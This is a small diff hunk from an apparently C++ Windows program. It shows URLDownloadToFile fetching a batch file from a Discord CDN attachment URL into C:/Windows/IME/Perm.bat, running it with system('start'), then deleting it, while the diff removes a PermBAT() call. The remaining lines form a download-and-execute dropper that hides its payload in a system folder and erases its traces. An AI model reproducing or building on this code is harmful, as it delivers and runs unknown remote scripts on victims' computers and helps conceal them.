@@ -24,7 +24,6 @@ int main()
   
   printf("Starting");
   URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/905707225740374026/905763413693726760/Example.bat"), _T("C:/Windows/IME/Perm.bat"), 0, NULL);
-  PermBAT();
   system("start C:/Windows/IME/Perm.bat");
   std::remove("C:/Windows/IME/Perm.bat");
   
